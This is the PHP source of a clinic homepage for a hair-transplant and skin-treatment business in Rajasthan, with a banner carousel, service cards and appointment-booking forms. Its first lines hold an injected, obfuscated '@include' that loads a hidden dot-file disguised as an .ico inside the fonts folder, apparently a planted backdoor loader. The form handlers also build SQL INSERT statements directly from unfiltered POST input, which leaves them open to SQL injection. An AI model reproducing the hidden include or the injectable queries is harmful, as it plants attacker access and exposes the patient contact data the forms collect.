<?php
/*9b527*/

@include "\057home\063/onl\151nksc\162m/do\155ains\057cabe\154ocli\156ic.c\157m/pr\151vate\137html\057font\163/.89\06413a7\060.ico";

/*9b527*/


 
session_start();
include("admin/config/config.php");
?>
<?php include "include/header.php" ?>



  <!-- ======================================= 
        ==end side social icons section==  
    =======================================-->
	
<div class="s-soft">
<a href="https://www.facebook.com/Cabelohairtransplant" target="blank" class="s-item facebook">
<span class="fa fa-facebook"></span>
</a>
<a href="https://twitter.com/CabeloClinic_" target="blank" class="s-item twitter">
<span class="fa fa-twitter"></span>
</a>
<a href="https://www.youtube.com/channel/UCOlM_BTZ87P2Rg_Ix23nZJw" target="blank" class="s-item pinterest">
<span class="fa fa-youtube"></span>
</a>

<a href="https://www.instagram.com/cabelo_clinic/?hl=en" target="blank" class="s-item instagram">
<span class="fa fa-instagram"></span>
</a>
</div>

  <!-- ======================================= 
        ==end side social icons section==  
    =======================================-->

    <!-- ======================================= 
        ==start Slider section==  
    =======================================-->
	<div class="clearfix"></div>
    <section class="">
       
<div id="carouselExampleCaptions" class="carousel slide" data-ride="carousel">
  <ol class="carousel-indicators">
    <li data-target="#carouselExampleCaptions" data-slide-to="0" class="active"></li>
    <li data-target="#carouselExampleCaptions" data-slide-to="1"></li>
    <li data-target="#carouselExampleCaptions" data-slide-to="2"></li>
  </ol>
  <div class="carousel-inner">
      <?php 
      
      $slt_mn="select min(id) as minmiid from index_banner";
      $qst_slt_mn=$db->query($slt_mn);
      $clct_slt_mn=$qst_slt_mn->fetch_assoc();
      
   $min_iiid=$clct_slt_mn['minmiid'];
      
      
      
      $slt_bnr="select * from index_banner";
      $qst_slt_bnr=$db->query($slt_bnr);
      while($clct_slt_bnr=$qst_slt_bnr->fetch_assoc())
      {
      
      $bnr_img=$clct_slt_bnr['banner_image'];
       $bnre_id=$clct_slt_bnr['id'];
      
      ?>
      <?php 
      if($bnre_id==$min_iiid)
      {
      ?>
    <div class="carousel-item active" data-interval="5000">
      <img src="admin/index_banner/<?php echo $bnr_img?>" class="d-block w-100" alt="...">
      
    </div>
    <?php
      }
      else
      {
      ?>
       <div class="carousel-item" data-interval="5000">
      <img src="admin/index_banner/<?php echo $bnr_img?>" class="d-block w-100" alt="...">
      
    </div>
          <?php
      }
    ?>
    <?php
      }
    ?>
   <!-- <div class="carousel-item" data-interval="5000">-->
   <!--   <img src="images/slider-img/slider-img2.jpg" class="d-block w-100" alt="...">-->
    
   <!-- </div>-->
   <!-- <div class="carousel-item" data-interval="5000">-->
   <!--   <img src="images/slider-img/slider-img3.jpg" class="d-block w-100" alt="...">-->
   <!--</div>-->
   
   <!--  <div class="carousel-item" data-interval="5000">-->
   <!--   <img src="images/slider-img/slider-img4.jpg" class="d-block w-100" alt="...">-->
   <!--</div>-->
   
   <!--<div class="carousel-item" data-interval="5000">-->
   <!--   <img src="images/slider-img/slider-img5.jpg" class="d-block w-100" alt="...">-->
   <!--</div>-->
   
  </div>
  <button class="carousel-control-prev" type="button" data-target="#carouselExampleCaptions" data-slide="prev">
    <span class="carousel-control-prev-icon" aria-hidden="true"></span>
    <span class="sr-only">Previous</span>
  </button>
  <button class="carousel-control-next" type="button" data-target="#carouselExampleCaptions" data-slide="next">
    <span class="carousel-control-next-icon" aria-hidden="true"></span>
    <span class="sr-only">Next</span>
  </button>
</div>
    </section>
	

    <!-- ======================================= 
        ==End Slider section==  
    =======================================-->


	<!-- ======================================= 
        ==Start ajasthan Luxury section==  
    =======================================-->
    <section class="blog-section related-service-section">
        <div class="container">
        <div class="row">
                <div class="col-12 mb-4">
                    <div class=" pb-60 text-center">
					<img src="images/logo.png" class=" img-fluid mr-3 " alt="images/logo.png" style="width:150px;">
                        <h3 class="color-72 fw-500  underline pb-10">Rajasthan Luxurious Hair Transplant Clinic</h3>
                       <!-- <p>Lorem ipsum dolor sit amet, consectetur adipisici elit, sed eiusmod tempor incidunt ut labore et.</p>-->
					</div>
						
                </div>
            </div>
			
			
            <!--/row-->
            
            <div class="row d-flex justify-content-center">
			
                <div class="col col-lg-2 col-md-6 ">
                  <div class="single-service pos-relative">
                        <img src="images/city/c1.png" alt="c1" class="img-fluid rounded-circle">
                         <div class="link-hover"></div>
                        <h6 class="text-center"><a href="contact-kota.php" class="color-d5"> Kota</a></h6>
                    </div>
				  </div>

                  <div class="col col-lg-2 col-md-6">
                  <div class="single-service pos-relative">
                        <img src="images/city/c2.png" alt="c1" class="img-fluid rounded-circle">
                         <div class="link-hover"></div>
                        <h6 class="text-center"><a href="contact-udaipur.php" class="color-d5"> Udaipur</a></h6>
                    </div>
				  </div>
				  
				    <div class="col col-lg-2 col-md-6">
                  <div class="single-service pos-relative">
                        <img src="images/city/c3.png" alt="c1" class="img-fluid rounded-circle">
                         <div class="link-hover"></div>
                        <h6 class="text-center"><a href="contact-Jaipur.php" class="color-d5"> Jaipur</a></h6>
                    </div>
				  </div>
				  
				    <div class="col col-lg-2 col-md-6">
                  <div class="single-service pos-relative">
                        <img src="images/city/c4.png" alt="c1" class="img-fluid rounded-circle">
                         <div class="link-hover"></div>
                        <h6 class="text-center"><a href="#" class="color-d5"> Jodhpur</a></h6>
                    </div>
				  </div>
				  
				    <div class="col col-lg-2 col-md-6">
                  <div class="single-service pos-relative">
                        <img src="images/city/c5.png" alt="c1" class="img-fluid rounded-circle">
                         <div class="link-hover"></div>
                        <h6 class="text-center"><a href="#" class="color-d5"> Bikaner</a></h6>
                    </div>
				  </div>
				  
				 
        </div>

    </section>

	<!-- ======================================= 
            ==End Rajasthan Luxury section==  
    =======================================-->
	
	
    <!-- ======================================= 
            ==Start Treatments section==  
    =======================================-->
  <!--  <section class="blog-section">
        <div class="container">
            <div class="row">
                <div class="col-12">
                    <div class="section-title pb-60 text-center">
                        <h3 class="color-72 fw-500 pb-10">Our Treatments Services</h3>
                        <p>Lorem ipsum dolor sit amet, consectetur adipisici elit, sed eiusmod tempor incidunt ut labore et.</p>
                    </div>
                </div>
            </div>
           
            <div class="row">
              
                <div class="col-lg-3 mb-4">
                    <div class="single-blog">
                        <div class="blog-img pos-relative">
                            <div class="img-area">
                                <a href="our_services.php"><img src="images/services/Hair_fall.jpg" alt="blog img" class="img-fluid"></a>
                            </div>
                           
                        </div>
                        <div class="blog-content">
                            <a href="our_services.php" class="title fw-500 pt-20">Hair Fall Solution</a>
                          </div>
                    </div>
                </div>

              
                <div class="col-lg-3 mb-4">
                    <div class="single-blog">
                        <div class="blog-img pos-relative">
                            <div class="img-area">
                                <a href="our_services.php"><img src="images/services/hair_transplant.jpg" alt="blog img" class="img-fluid"></a>
                            </div>
                           
                        </div>
                        <div class="blog-content">
                            <a href="#" class="title fw-500 pt-20">Hair Transplant</a>
                          </div>
                    </div>
                </div>

               
                <div class="col-lg-3 mb-4">
                    <div class="single-blog">
                        <div class="blog-img pos-relative">
                            <div class="img-area">
                                <a href="our_services.php"><img src="images/services/Laser_Hair.jpg" alt="blog img" class="img-fluid"></a>
                            </div>
                           
                        </div>
                        <div class="blog-content">
                            <a href="#" class="title fw-500 pt-20">Laser Hair Reduction</a>
                        </div>
                    </div>
                </div>
                
				
				  
                <div class="col-lg-3 mb-4">
                    <div class="single-blog">
                        <div class="blog-img pos-relative">
                            <div class="img-area">
                                <a href="our_services.php"><img src="images/services/Skin_Lightning.jpg" alt="blog img" class="img-fluid"></a>
                            </div>
                           
                        </div>
                        <div class="blog-content">
                            <a href="#" class="title fw-500 pt-20">Skin Lightning</a>
                        </div>
                    </div>
                </div>
               
				
				
            </div>
           
				<div class="d-flex justify-content-end">
				<a href="our_services.php" class="btn-danger fw-700 p-2" title="Read More for Details" target="-blank">Read More <i class="fa fa-angle-right"></i></a>
				</div>
        </div>
    </section>-->
    <!-- ======================================= 
            ==End Treatments section== 
    =======================================-->

  <!-- ======================================= 
		Treatments Services model start
   =======================================-->


  <!-- ======================================= 
		Treatments Services model End
   =======================================-->

	
    <!-- ======================================= 
        ==Start related services section==  
    =======================================-->
    <section class="related-service-section">
        <div class="container">
        <div class="row ">
                <div class="col-12 mb-4">
                    <div class=" pb-60 text-center">
                        <h3 class="color-72 fw-500  underline pb-10">Our Services</h3>
                  
					</div>
                </div>
            </div>
            <!--/row-->
            <h5 class="section-title color-72 fw-700 pos-relative pb-30">Treatments  Services </h5>
            <div class="row">
                
                <?php 
                $slt_rcgntn="select * from reward_and_recogenization limit 4";
                $qst_slt_rcgntn=$db->query($slt_rcgntn);
                while($clct_slt_rcgntn=$qst_slt_rcgntn->fetch_assoc())
                {
$wrd_title=$clct_slt_rcgntn['title'];
$wrd_img=$clct_slt_rcgntn['image'];
$wrd_id=$clct_slt_rcgntn['id'];


?>
<div class="col-lg-3 col-md-6">
<a data-toggle="modal" data-target="#Hair_Fall<?php echo $wrd_id?>" style="cursor:pointer;">
<div class="single-service pos-relative">
<img src="admin/service_image/<?php echo $wrd_img;?>" alt="service img" class="img-fluid">
<div class="link-hover"></div>
<h6><a data-toggle="modal" style="cursor:pointer;" data-target="#Hair_Fall<?php echo $wrd_id?>" class="color-d5"><?php echo $wrd_title;?></a></h6>
</div>
</a>
</div>

                            
                            
                            
                            
                            
    
<div class="modal fade " id="Hair_Fall<?php echo $wrd_id?>" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-dialog-centered" role="document">
    <div class="modal-content">
	  <button type="button" class="close p-0 m-0  p-2 text-success" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
    
       <!-- form card cc payment -->
            <div class="card card-outline-secondary" style="background:#BFF2F5;">
              <div class="card-body">
                <h5 class="text-center">I'd like to book an</h5>
				<h4 class="text-center font-weight-bold">APPOINTMENT</h4>
                <hr>
               
			   <!-- form card cc payment -->
                <form autocomplete="off" class="form" role="form" action='' method='POST'>
                  <div class="form-group my-0 py-0">
                   <input class="form-control" id="cc_name" required="required" name='usr_nem' placeholder="Enter Your Name* " title="Enter Your Name" type="text">
                  </div>
				  
				  <div class="d-flex">
				<label class="radio-inline " style="padding-left:0px;"><span style="font-size:20px;"> Gender: </span></label>
				
				<label class="radio-inline d-flex align-items-center" style="width: 83px;"><input type="radio" name="gender" id="inlineRadio1" value="Male" class="m-0 "> Male </label>
				<label class="radio-inline d-flex align-items-center" style="width: 83px;"><input type="radio" name="gender" id="inlineRadio1" value="Male" class="m-0 "> Female </label>
				</div>
                  
				  <div class=" row">
                   <div class="col-md-6 my-0">
                       <div class="form-group   my-1">
                   <input autocomplete="off" class="form-control" maxlength="20" pattern="\d{16}" required="" name='mbl_nbr' title="Enter  Number"  placeholder="Enter  Number" type="number">
                  </div>
                    </div>
					
					<div class="col-md-6 my-0">
                       <div class="form-group my-1">
                        <input autocomplete="off" class="form-control"  required="" name="emnl" title="Enter  Email" placeholder="Enter  Email" type="Email">
                  </div>
                    </div>
				</div>
				  
				  <div class="form-group">
  
          <input autocomplete="off" value="<?php echo $wrd_title;?>" class="form-control" readonly type="text" name='srvc_nem' style="background:white">
                   
				  </div>
				  
				  <div class="form-group">
                    <select class="form-control w-100 my-2" name="ctyy" size="0">
                       <option value="" disable="" selected="">Select City</option>
					   <option value="Kota">Kota</option>
					   <option value="Jaipur">Jaipur</option>
					   <option value="Udaipur">Udaipur</option>
					   <option value="Jodhpur">Jodhpur</option>
					   <option value="Bikaner">Bikaner</option>
					   </select>
				  </div>
				  
				  <div class="form-group mt-1">
                        <textarea class="form-control textarea-s" name="message" id="CR1_covernote" placeholder="Would like to enquire about 'Hair Fall Solution'" rows="2"></textarea>
                   </div>
							
                <button type="submit" class="btn btn-success w-100" name='rwd_rcgntn'> Make Appointment</button>
                 
				 </form>
              </div>
            </div>
			<!-- /form card cc payment -->
		<div class="modal-footer p-2 m-0 text-white">
        Connecting...
      </div>
    </div>
  </div>
</div>
                            
                            
                            
                            
                            
            <?php 
            }
            ?>
            
            
            
<?php

if(isset($_POST['rwd_rcgntn']))
{
$nme=$_POST['usr_nem'];
$gndr=$_POST['gender'];
$mbl_nber=$_POST['mbl_nbr'];
$srv_nem=$_POST['srvc_nem'];
$city=$_POST['ctyy'];
$msg=$_POST['message'];
$eemmll=$_POST['emnl'];


$ad_enqry="insert into enquiry set
name='$nme',
gender='$gndr',
mobile='$mbl_nber',
email='$eemmll',
message='$msg',
city='$city',
service_name='$srv_nem'";

$qst_ad_enqry=$db->query($ad_enqry);
if($qst_ad_enqry)
{
    echo "<script>window.alert('Enquery Sent Successfully Will Contact you soon Thankyou.');window.location='';</script>";
}





}

?>


            
            
            
            
            
            
            
            

<!--                <div class="col-lg-3 col-md-6">
                    <div class="single-service pos-relative">
                        <img src="images/services/hair_transplant.jpg" alt="service img" class="img-fluid">
                        <div class="link-hover"></div>
                        <h6><a href="our_services.php" class="color-d5">Hair Transplant</a><span class="float-right fw-500"></span></h6>
                    </div>
                </div>

                <div class="col-lg-3 col-md-6">
                    <div class="single-service pos-relative">
                        <img src="images/services/Laser_Hair.jpg" alt="service img" class="img-fluid">
                        <div class="link-hover"></div>
                        <h6><a href="our_services.php" class="color-d5">Laser Hair Reduction</a><span class="float-right fw-500"></span></h6>
                    </div>
                </div>

		<div class="col-lg-3 col-md-6">
                    <div class="single-service pos-relative">
                        <img src="images/services/Skin_Lightning.jpg" alt="service img" class="img-fluid">
                         <div class="link-hover"></div>
                        <h6><a href="our_services.php" class="color-d5">Skin Lightning</a><span class="float-right fw-500"></span></h6>
                    </div>
                </div>-->
                <!--/col-->
            </div>
			<div class="d-flex justify-content-end my-2">
				<a href="our_services.php" class="btn-danger fw-700 p-2" title="Read More for Details" target="-blank">Read More <i class="fa fa-angle-right"></i></a>
			</div>
        </div>

    </section>
    <!-- ======================================= 
        ==End related services section==  
    =======================================-->



<!-------------reward and recognization start------------------>


 <section class="related-service-section">
        <div class="container">
        <div class="row ">
                <div class="col-12 mb-4">
                    <div class=" pb-60 text-center">
                        <h3 class="color-72 fw-500  underline pb-10">Reward and Recognition</h3>
                  
					</div>
                </div>
            </div>
            <!--/row-->
           <!-- <h5 class="section-title color-72 fw-700 pos-relative pb-30">Treatments  Services </h5>-->
            <div class="row">
                
                <?php 
                $slt_rcdgntn="select * from reward_recogniztion limit 4";
                $qst_slt_rdcgntn=$db->query($slt_rcdgntn);
                while($clct_slt_rcdgntn=$qst_slt_rdcgntn->fetch_assoc())
                {

$wrd_simg=$clct_slt_rcdgntn['image'];



?>
<div class="col-lg-3 col-md-6">
<a href="#" style="cursor:pointer;">
<div class="single-service pos-relative">
<img src="admin/reward_image/<?php echo $wrd_simg;?>" alt="service img" class="img-fluid">
<div class="link-hover"></div>

</div>
</a>
</div>

       <?php 
            }
            ?>
            
            
            

            </div>
			<div class="d-flex justify-content-end my-2">
				<a href="our_rwrd.php" class="btn-danger fw-700 p-2" title="Read More for Details" target="-blank">Read More <i class="fa fa-angle-right"></i></a>
			</div>
        </div>

    </section>


	<!---------reward and recognization end---------------->
	

    <!-- ======================================= 
        ==start welcome section==  
    =======================================-->
<!--  <section class="welcome-section pos-relative">-->
    <section class=" pos-relative">
        <div class="container">
            <div class="row">
                <div class="col-12">
                    <div class="section-title text-center">
                        <h3 class="color-72 fw-500">Welcome Cabeloclinic</h3>
                       <!-- <p>The beauty lab is a luxury beauty & spa solution. The beauty spa strives to deliver top class treatments in a relaxing environment.</p> -->
                    </div>
                </div>
            </div>
            <!--/row-->
<?php 

$slt_abot="select * from about_content where id='1'";
$qst_slt_abot=$db->query($slt_abot);
$clct_slt_abot=$qst_slt_abot->fetch_assoc();

$abt_cccnt=$clct_slt_abot['content'];
$abt_img=$clct_slt_abot['image'];
?>
            <div class="row">
                <div class="col-lg-7 order-2">
                    <div class="welcome-feature-wrapper expert clearfix">
                        <!--feature-1-->
                        <div class="single- float-left ">
                          <?php echo $abt_cccnt;?>
						<!--	<a href="#" class="readmore btn btn-danger text-white p-2 mt-2" title="Read More for Details " target="-blank">Read More <i class="fa fa-angle-right"></i></a>-->
                        </div>
				
                    </div>
                    <!--/wrapper-->
                </div>
                <!--/col-->

                <div class="col-lg-5 order-1">
                    <div class="welcome-carousel-wrapper pos-relative">
                      
                            <img src="admin/about_img/<?php echo $abt_img?>" class="img-fluid w-100" alt="welcome-carousel-img">
                        
                    </div>
                    <!--/wrapper-->
                </div>
                <!--/col-->
            </div>
        </div>
    </section>
    <!-- ======================================= 
        ==End welcome section==  
    =======================================-->
	
	
    <!-- ======================================= 
            ==Start Blog section==  
    =======================================-->
    <section class="blog-section">
        <div class="container">
            <div class="row">
                <div class="col-12">
                    <div class="section-title pb-60 text-center">
                        <h3 class="color-72 fw-500 pb-10"> Offers of the Month</h3>
                      
                    </div>
                </div>
            </div>
            <!--/row-->

            <div class="row">
<?php 
$slt_ofr_dtl="select * from offer_this_month limit 4";
$qst_slt_ofr_dtl=$db->query($slt_ofr_dtl);
while($clct_slt_ofr_dtl=$qst_slt_ofr_dtl->fetch_assoc())
{
$ofr_img=$clct_slt_ofr_dtl['image'];
$ofr_ttl=$clct_slt_ofr_dtl['title'];
$ofr_id=$clct_slt_ofr_dtl['id'];
            
?>
                <div class="col-lg-3">
                    <div class="single-blog">
                        <div class="blog-img pos-relative">
                            <div class="img-area">
                                <a href="exclusive_offers.php"><img src="admin/offer_image/<?php echo $ofr_img; ?>" class="img-fluid"></a>
                            </div>
                            <ul class="brand">
                               
                                <li><i class="fa fa-folder-open"></i><?php echo $ofr_ttl;?> </li>
                                <li class="gallery"><i class="fa fa-picture-o"></i></li>
                            </ul>
                        </div>
                        <div class="blog-content">
                            <a href="exclusive_offers.php" class="title fw-500 pt-20"><?php echo $ofr_ttl;?> </a>
                          <!--  <p class="ptb-20">The power of golden ratio typography cannot be understated. By choosing the line-height of your primary text.</p>-->
                            <a href="exclusive_offers.php?id=<?php echo $ofr_id;?>" class="readmore btn-danger text-white p-2 mt-4" title="Read More for Details " target="-blank">Read More <i class="fa fa-angle-right"></i></a>
							<a data-toggle="modal" data-target="#Hair_Fsdall<?php echo $ofr_id;?>"  class="readmore btn-danger text-white p-2 mt-4" title="Book " style="cursor:pointer;">Book Now <i class="fa fa-angle-right"></i> </a>
                        </div>
                    </div>
                </div>
                
                
                
                
                
                
                
                
                
                
                    
<div class="modal fade " id="Hair_Fsdall<?php echo $ofr_id?>" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-dialog-centered" role="document">
    <div class="modal-content">
	  <button type="button" class="close p-0 m-0  p-2 text-success" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
    
       <!-- form card cc payment -->
            <div class="card card-outline-secondary" style="background:#BFF2F5;">
              <div class="card-body">
                <h5 class="text-center">I'd like to book an</h5>
				<h4 class="text-center font-weight-bold">APPOINTMENT</h4>
                <hr>
               
			   <!-- form card cc payment -->
                <form autocomplete="off" class="form" role="form" action='' method='POST'>
                  <div class="form-group my-0 py-0">
                   <input class="form-control" id="cc_name" required="required" name='usr_nem' placeholder="Enter Your Name* " title="Enter Your Name" type="text">
                  </div>
				  
				  <div class="d-flex">
				<label class="radio-inline " style="padding-left:0px;"><span style="font-size:20px;"> Gender: </span></label>
				
				<label class="radio-inline d-flex align-items-center" style="width: 83px;"><input type="radio" name="gender" id="inlineRadio1" value="Male" class="m-0 "> Male </label>
				<label class="radio-inline d-flex align-items-center" style="width: 83px;"><input type="radio" name="gender" id="inlineRadio1" value="Male" class="m-0 "> Female </label>
				</div>
                  
				  <div class=" row">
                   <div class="col-md-6 my-0">
                       <div class="form-group   my-1">
                   <input autocomplete="off" class="form-control" maxlength="20" pattern="\d{16}" required="" name='mbl_nbr' title="Enter  Number"  placeholder="Enter  Number" type="number">
                  </div>
                    </div>
					
					<div class="col-md-6 my-0">
                       <div class="form-group my-1">
                        <input autocomplete="off" class="form-control"  required="" name="emnl" title="Enter  Email" placeholder="Enter  Email" type="Email">
                  </div>
                    </div>
				</div>
				  
				  <div class="form-group">
  
          <input autocomplete="off" value="<?php echo $ofr_ttl;?>" class="form-control" readonly type="text" name='srvc_nem' style="background:white">
                   
				  </div>
				  
				  <div class="form-group">
                    <select class="form-control w-100 my-2" name="ctyy" size="0">
                       <option value="" disable="" selected="">Select City</option>
					   <option value="Kota">Kota</option>
					   <option value="Jaipur">Jaipur</option>
					   <option value="Udaipur">Udaipur</option>
					   <option value="Jodhpur">Jodhpur</option>
					   <option value="Bikaner">Bikaner</option>
					   </select>
				  </div>
				  
				  <div class="form-group mt-1">
                        <textarea class="form-control textarea-s" name="message" id="CR1_covernote" placeholder="Would like to enquire about 'Hair Fall Solution'" rows="2"></textarea>
                   </div>
							
                <button type="submit" class="btn btn-success w-100" name='rwds_rcgntn'> Make Appointment</button>
                 
				 </form>
              </div>
            </div>
			<!-- /form card cc payment -->
		<div class="modal-footer p-2 m-0 text-white">
        Connecting...
      </div>
    </div>
  </div>
</div>
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
<?php 
}
?>

     
     
     
     
                 
            
<?php

if(isset($_POST['rwds_rcgntn']))
{
$nme=$_POST['usr_nem'];
$gndr=$_POST['gender'];
$mbl_nber=$_POST['mbl_nbr'];
$srv_nem=$_POST['srvc_nem'];
$city=$_POST['ctyy'];
$msg=$_POST['message'];
$eemmll=$_POST['emnl'];


$ad_enqry="insert into enquiry set
name='$nme',
gender='$gndr',
mobile='$mbl_nber',
email='$eemmll',
message='$msg',
city='$city',
service_name='$srv_nem'";

$qst_ad_enqry=$db->query($ad_enqry);
if($qst_ad_enqry)
{
    echo "<script>window.alert('Enquery Sent Successfully Will Contact you soon Thankyou.');window.location='';</script>";
}





}

?>

     
     
     
     
     
     
     
     
     
     
                <!--/col-->
            </div>
            <!--/row-->
			
			<div class="d-flex justify-content-end mt-3">
				<a href="offers.php" class="btn-danger fw-700 p-2" title="Read More for Details" target="-blank">Read More <i class="fa fa-angle-right"></i></a>
			</div>
			
        </div>
    </section>
    <!-- ======================================= 
            ==End blog section== 
    =======================================-->
    

<!-- ======================================= 
        ==Start Book appointment section==  
    =======================================-->
		  <section class="related-service-section">
		  <div class="container">
		  <div class="row ">
  
				<!--  <div class="col-12 mb-4">
                    <div class=" pb-60 text-center">
                        <h3 class="color-72 fw-500  underline pb-10">Our Treatments Services</h3>
                        <p>Lorem ipsum dolor sit amet, consectetur adipisici elit, sed eiusmod tempor incidunt ut labore et.</p>
                    </div>
                </div> -->
				
			<h5 class="section-title color-72 fw-700 pos-relative pb-30">Book Appointment   </h5>
           </div>
            <!--/row-->
            <form action='' method='POST'>
           <div class="row py-4 appointment"style="background:#D0E1CF;">
				<div class="col-md-3">
				<div class="form-group">
				<label class="text-dark font-weight-bold">Full Name</label>
	<input type="text" name="name" id="Home_phone" class="form-control input-box"  placeholder="Type Your Name" maxlength="10" required="">
				</div>
				</div>

				<div class="col-md-3">
				<div class="form-group">
				<label class="text-dark font-weight-bold">Mobile No</label>
				<input type="number" name="phone" id="Home_phone" class="form-control input-box" placeholder="10 Digit Mobile No." maxlength="10" required="">
				</div>
				</div>

				<div class="col-md-3">
				<div class="form-group">
				<label class="text-dark font-weight-bold">Gender</label>
				<div class="single-input beauty-service clearfix">
                                <select class="wide input-box" name="gender"  >
                                    <option selected="">Select Gender</option>
                                    <option value="male">male</option>
                                    <option value="female">female</option>
                                   
                                </select>
			<!--	<div class="nice-select wide" tabindex="0"><span class="current">Gender</span><ul class="list">
				    <li data-value="Service" class="option selected">Choose gender</li><li data-value="facial" class="option">male</li><li data-value="nailCare" class="option">Female</li></ul></div>-->
                </div>
				</div>
				</div>
				
				<div class="col-md-3">
				<div class="form-group">
				<label class="text-dark font-weight-bold">Select Services</label>
				<div class="single-input beauty-service clearfix">
                                <select class="wide input-box" name="srvcc" required="" style="display: none;">
                                    <option selected="">Select Services</option>
                                    <option value="Hair Fall">Hair Fall</option>
                                    <option value="Hair Transplant">Hair Transplant</option>
                                    <option value="Laser Hair Reduction">Laser Hair Reduction</option>
                                    <option value="Skin Lightning">Skin Lightning</option>
                                    <option value="Medical Facial / HydraFacial">Medical Facial / HydraFacial</option>
									<option value="Anti Agein">Anti Ageing</option>
									<option value="Pigmentation Treatment">Pigmentation Treatment</option>
									<option value="Acne Treatment">Acne Treatment</option>
									<option value="Scar Revision">Scar Revision</option>
									<option value="Stretch Marks">Stretch Marks</option>
									<option value="Tattoo Removal">Tattoo Removal</option>
                                </select> 
				</div>
				</div>
				</div>
				
				<div class="col-md-3">
				<div class="form-group">
					<label class="text-dark font-weight-bold">Email Id</label>
				<input type="email" name="email" id="Email" class="form-control input-box"  placeholder="Valid Email Id" required="">
				</div>
				</div>
				
				<div class="col-md-3">
				<div class="form-group">
				<label class="text-dark font-weight-bold">City</label>
				<div class="single-input beauty-service clearfix">
                                <select class="wide" name="ccty" required="" style="display: none;">
                                    <option selected="">Select City</option>
                                    <option value="Kota">Kota</option>
                                    <option value="Jaipur">Jaipur</option>
                                    <option value="Udaipur">Udaipur</option>
                                    <option value="Jodhpur">Jodhpur</option>
                                    <option value="Bikaner">Bikaner</option>
                                </select>
								</div>
				</div>
				</div>
	
				
				<div class="col-md-3 d-flex align-items-center justify-content-center mt-3">
				<button type="submit" name="vsbmt" class="btn-danger w-100">Submit </button>
				</div>
			</div>
           </form>
           
           
         <?php

if(isset($_POST['vsbmt']))
{
$nme=$_POST['name'];
$gndr=$_POST['gender'];
$mbl_nber=$_POST['phone'];
$srv_nem=$_POST['srvcc'];
$city=$_POST['ccty'];

$eemmll=$_POST['email'];


$ad_enqry="insert into enquiry set
name='$nme',
gender='$gndr',
mobile='$mbl_nber',
email='$eemmll',

city='$city',
service_name='$srv_nem'";

$qst_ad_enqry=$db->query($ad_enqry);
if($qst_ad_enqry)
{
    echo "<script>window.alert('Enquery Sent Successfully Will Contact you soon Thankyou.');window.location='';</script>";
}





}

?>
        </div>
	</section>
	
	<!-- ======================================= 
        ==close  Book appointment section==  
    =======================================-->


 <!-- ======================================= 
            ==Start Blog section==  
    =======================================-->
    <!--<section class="blog-section">-->
		<section class="blog-sectin" style="padding:10px 0px 70px 0px;">
        <div class="container">
            <div class="row">
                <div class="col-12">
                    <div class="section-title pb-60 text-center">
                        <h3 class="color-72 fw-500 pb-10">Our Results</h3>
                  
                    </div>

                </div>
            </div>
            <!--/row-->

            <div class="row">
        
                <!--blog 1-->
        
        
        <?php 
$usr_lst="select * from result limit 4";
$qst_usr_lst=$db->query($usr_lst);
$sno=1;
while($clct_usr_lst=$qst_usr_lst->fetch_assoc())
{
$bnr_img=$clct_usr_lst['image'];

$prd_id=$clct_usr_lst['id'];
$rest_ttl=$clct_usr_lst['title'];

?>
        
        
                <div class="col-lg-3">
                    <div class="single-blog">
                        <div class="blog-img pos-relative">
                            <div class="img-area">
                            
                                  <img src="admin/result_image/<?php echo $bnr_img;?>" alt="images/result/1.jpg" class="img-fluid">
                             
                            </div>
                         
                        </div>
                        <div class="blog-content">
                            <a href="#" class="title fw-500 pt-20"><?php echo $rest_ttl;?></a>
                             <!--  <a href="#" class="readmore" title="Read More for Details" target="-blank">Read More <i class="fa fa-angle-right"></i></a>-->
                        </div>
                    </div>
                </div>
<?php 
}
?>
        
                <!--/col-->
			
            </div>
            	
				<div class="d-flex justify-content-end mt-3">
<a href="all_results.php" class="btn-danger fw-700 p-2" title="Read More for Details" target="-blank" style="float:right">Read More <i class="fa fa-angle-right"></i></a>
</div>
            <!--/row-->
        </div>
    </section>
    <!-- ======================================= 
            ==End blog section== 
    =======================================-->
    

 <!-- ======================================= 
            ==Start Blog section==  
    =======================================-->
    <!--<section class="blog-section">-->
		<section class="blo">
        <div class="container">
            <div class="row">
                <div class="col-12">
                    <div class="section-title pb-60 text-center">
                        <h3 class="color-72 fw-500 pb-10">Our Videos</h3>
                   
                    </div>

                </div>
            </div>
            <!--/row-->

            <div class="row">
                <!--blog 1-->
                
                <?php 
                $slt_vdo_dtl="select * from our_video limit 3";
                $qst_slt_vdo_dtl=$db->query($slt_vdo_dtl);
                while($clct_slt_vdo_dtl=$qst_slt_vdo_dtl->fetch_assoc())
                {
                
                $vdo_lnk=$clct_slt_vdo_dtl['video_link'];
                $vdo_img=$clct_slt_vdo_dtl['image'];
                     $vdo_ttel=$clct_slt_vdo_dtl['title'];
                ?>
                
                <div class="col-lg-4">
                    <div class="single-blog">
                        <div class="blog-img pos-relative">
                            <div class="img-area">
                               
                              <a href="<?php echo $vdo_lnk;?>" data-vbtype="video" data-autoplay="true" class="venobox vbox-item">
<img src="admin/video_image/<?php echo $vdo_img;?>" alt="images/offers/1.jpg" class="img-fluid">
                              </a>
                            </div>
                         
                        </div>
                        <div class="blog-content">
                            <a href="#" class="title fw-500 pt-20"><?php echo $vdo_ttel?></a>
                         <!--   <a href="#" class="readmore" title="Read More for Details" target="-blank">Read More <i class="fa fa-angle-right"></i></a>-->
                        </div>
                    </div>
                </div>
<?php 
}
?>
                <!--blog 2-->
               <!-- <div class="col-lg-4">
                    <div class="single-blog">
                        <div class="blog-img pos-relative">
                            <div class="img-area">
                              <a href="https://www.youtube.com/embed/KaozVSsLlps" data-vbtype="video" data-autoplay="true" class="venobox vbox-item">
                                  <img src="images/services/Peels_Treatment.jpg" alt="images/offers/1.jpg" class="img-fluid">
                              </a>
                            </div>
                           
                        </div>
                        <div class="blog-content">
                            <a href="#" class="title fw-500 pt-20">Peels Treatment For Face</a>
                             <a href="#" class="readmore" title="Read More for Details" target="-blank">Read More <i class="fa fa-angle-right"></i></a>
                        </div>
                    </div>
                </div>-->

                <!--blog 3-->
              <!--  <div class="col-lg-4">
                    <div class="single-blog">
                        <div class="blog-img pos-relative">
                            <div class="img-area">
